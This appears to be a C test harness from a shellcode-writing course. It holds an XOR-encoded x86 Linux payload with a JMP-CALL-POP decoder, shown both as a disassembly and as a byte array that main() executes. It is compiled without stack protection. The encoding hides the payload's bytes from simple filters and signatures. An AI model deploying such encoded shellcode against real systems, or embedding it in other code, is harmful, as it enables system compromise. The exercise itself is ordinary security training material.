/*

// Author: Cameron, James
// Compile With: gcc test.c -fno-stack-protector -z execstack
// Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
//            Ubuntu 12.04.4 LTS

slae@ubuntu:~/Documents/github/shellcode/x86/xor-encoder_JmpCallPop$ objdump -M intel -d ./xor-decoder_JmpCallPop

./xor-decoder_JmpCallPop:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 0d                   jmp    804806f <call_decoder>

08048062 <decoder>:
 8048062:       5e                      pop    esi
 8048063:       31 c9                   xor    ecx,ecx
 8048065:       b1 2b                   mov    cl,0x2b

08048067 <decode>:
 8048067:       80 36 aa                xor    BYTE PTR [esi],0xaa
 804806a:       46                      inc    esi
 804806b:       e2 fa                   loop   8048067 <decode>
 804806d:       eb 05                   jmp    8048074 <shellcode>

0804806f <call_decoder>:
 804806f:       e8 ee ff ff ff          call   8048062 <decoder>

08048074 <shellcode>:
 8048074:       9b                      fwait
 8048075:       6a c2                   push   0xffffffc2
 8048077:       e9 e9 e9 e9 23          jmp    2bee6a65 <_end+0x23e9e9c5>
 804807c:       ae                      scas   al,BYTE PTR es:[edi]
 804807d:       8e 23                   mov    fs,WORD PTR [ebx]
 804807f:       48                      dec    eax
 8048080:       c2 e8 e8                ret    0xe8e8
 8048083:       e8 e8 23 4b c2          call   ca4fa470 <_end+0xc24b23d0>
 8048088:       85 d9                   test   ecx,ebx
 804808a:       c2 eb 22                ret    0x22eb
 804808d:       ee                      out    dx,al
 804808e:       8e a9 c2 85 c8 c3       mov    gs,WORD PTR [ecx-0x3c377a3e]
 8048094:       c4 23                   les    esp,FWORD PTR [ebx]
 8048096:       49                      dec    ecx
 8048097:       23 ce                   and    ecx,esi
 8048099:       8e a2 1a a1 67 2a       mov    fs,WORD PTR [edx+0x2a67a11a]

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x2b\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xc2\xe9\xe9\xe9\xe9\x23\xae\x8e\x23\x48\xc2\xe8\xe8\xe8\xe8\x23\x4b\xc2\x85\xd9\xc2\xeb\x22\xee\x8e\xa9\xc2\x85\xc8\xc3\xc4\x23\x49\x23\xce\x8e\xa2\x1a\xa1\x67\x2a";

int main(){

	printf("[*]Executing shellcode of length: %d\n", strlen(shellcode));
	int (*run)() = (int(*)())shellcode;
	run();
	return 0;

}
